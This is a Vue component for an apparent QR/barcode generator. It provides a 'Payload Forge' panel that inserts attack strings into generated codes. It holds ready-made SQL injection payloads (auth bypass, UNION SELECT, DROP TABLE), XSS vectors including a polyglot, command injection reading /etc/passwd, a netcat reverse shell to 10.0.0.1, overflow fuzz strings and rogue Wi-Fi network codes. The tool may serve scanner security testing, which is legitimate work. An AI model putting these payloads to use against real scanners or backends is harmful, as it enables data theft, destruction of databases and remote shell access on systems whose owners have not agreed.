<script setup>
import { ref, computed } from "vue";
import { store } from "../../store/state.js";

const props = defineProps({
  barcodeFormat: String,
  currentMode: {
    type: String,
    default: "qr",
  },
});

const emit = defineEmits(["apply", "openWifi"]);

const isDark = computed(() => store.config.darkMode);
const activeForgeCategory = ref("sqli");

const tacticalCategories = {
  sqli: {
    label: "SQL Injection",
    icon: "fa-database",
    payloads: [
      { label: "Auth Bypass (Classic)", val: "' OR '1'='1" },
      { label: "Auth Bypass (Comment)", val: "' OR 1=1 --" },
      { label: "Union Select", val: "' UNION SELECT 1, version(), user() --" },
      { label: "Time Based", val: "1'; WAITFOR DELAY '0:0:5'--" },
      { label: "Drop Table", val: "1'; DROP TABLE users; --" },
    ],
    compatible: ["qr", "code128", "pdf417", "datamatrix", "azteccode"],
  },
  xss: {
    label: "XSS Vector",
    icon: "fa-code",
    payloads: [
      { label: "Script Alert", val: "<script>alert('Pwned')<\\/script>" },
      { label: "Img OnErr", val: "<img src=x onerror=alert(1)>" },
      { label: "Body OnLoad", val: "<body onload=alert(1)>" },
      { label: "SVG OnLoad", val: "<svg/onload=alert(1)>" },
      // Escaped for safety in strings
      {
        label: "Polyglot",
        val: "javascript:/*--></title></style></textarea><\\/script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
      },
    ],
    compatible: ["qr", "pdf417", "datamatrix", "azteccode"], // No 1D
  },
  cmd: {
    label: "Command Inj",
    icon: "fa-terminal",
    payloads: [
      { label: "Cat Passwd", val: "; cat /etc/passwd" },
      { label: "Ping Loop", val: "; ping -c 10 127.0.0.1" },
      { label: "Netcat Rev Shell", val: "; nc -e /bin/sh 10.0.0.1 1234" },
      { label: "Windows Dir", val: "& dir c:\\" },
    ],
    compatible: ["qr", "code128", "pdf417", "datamatrix", "azteccode"],
  },
  fuzz: {
    label: "Fuzzing / Overflow",
    icon: "fa-shuttle-space",
    payloads: [
      { label: "Format String %s", val: "%s%s%s%s%s%s%s%s%s%s" },
      { label: "Format String %x", val: "%x%x%x%x%x%x%x%x%x%x" },
      { label: "Long String (1k)", val: "A".repeat(1000) },
      { label: "0x00 Null Byte", val: "\x00\x00\x00\x00" },
      { label: "Integer Overflow", val: "999999999999999999999999999" },
    ],
    compatible: ["qr", "pdf417", "datamatrix", "azteccode"],
  },
  wifi: {
    label: "Wi-Fi Trap (Rogue AP)",
    icon: "fa-wifi",
    payloads: [
      { label: "Open Network", val: "WIFI:T:nopass;S:Free_Wifi;P:;;" },
      {
        label: "WPA2 Weak",
        val: "WIFI:T:WPA;S:Starbucks_Guest;P:password123;;",
      },
      {
        label: "Hidden SSID",
        val: "WIFI:T:WPA;S:Hidden_Lab;P:SecretKey;H:true;;",
      },
    ],
    compatible: ["qr", "datamatrix", "azteccode"], // QR mostly
  },
};
</script>

<template>
  <div
    class="mt-4 pt-4 border-t"
    :class="isDark ? 'border-gray-700' : 'border-gray-100'"
  >
    <div class="flex items-center justify-between mb-3">
      <p class="text-xs font-semibold text-red-500">
        <i class="fa-solid fa-user-secret mr-1"></i>Payload Forge (Advanced)
      </p>
      <button
        @click="$emit('openWifi')"
        class="text-[10px] px-2 py-1 rounded bg-blue-500 text-white font-bold hover:bg-blue-600 transition-colors"
      >
        <i class="fa-solid fa-wifi mr-1"></i>Builder
      </button>
    </div>

    <!-- Category Tabs -->
    <div class="flex gap-1 mb-2 overflow-x-auto pb-1 no-scrollbar">
      <button
        v-for="(cat, key) in tacticalCategories"
        :key="key"
        @click="activeForgeCategory = key"
        :class="[
          'px-2 py-1 rounded text-[10px] font-bold whitespace-nowrap transition-all border',
          activeForgeCategory === key
            ? 'bg-red-500 text-white border-red-500'
            : isDark
            ? 'bg-gray-800 border-gray-600 text-gray-400'
            : 'bg-gray-100 border-gray-300 text-gray-500',
        ]"
      >
        <i :class="['fa-solid mr-1', cat.icon]"></i>{{ cat.label }}
      </button>
    </div>

    <!-- Payloads -->
    <div class="grid grid-cols-2 gap-2">
      <button
        v-for="p in tacticalCategories[activeForgeCategory].payloads"
        :key="p.label"
        @click="$emit('apply', p.val)"
        :class="[
          'text-left px-2 py-2 rounded border text-[10px] transition-all truncate hover:shadow-md',
          isDark
            ? 'bg-gray-800 border-gray-700 text-gray-300 hover:border-red-500'
            : 'bg-white border-gray-200 text-gray-600 hover:border-red-400',
          currentMode === 'barcode' &&
          !tacticalCategories[activeForgeCategory].compatible.includes(
            'code128'
          ) &&
          ['CODE128', 'CODE39', 'EAN13'].includes(barcodeFormat)
            ? 'opacity-50 cursor-not-allowed'
            : '',
        ]"
      >
        <div class="font-bold">{{ p.label }}</div>
        <div class="opacity-50 text-[9px] truncate">{{ p.val }}</div>
      </button>
    </div>

    <p
      v-if="
        currentMode === 'barcode' &&
        !tacticalCategories[activeForgeCategory].compatible.includes(
          'code128'
        ) &&
        ['CODE128', 'CODE39'].includes(barcodeFormat)
      "
      class="text-[10px] text-orange-500 mt-2"
    >
      <i class="fa-solid fa-triangle-exclamation"></i> 1D Barcodes may not
      support this payload size.
    </p>
  </div>
</template>
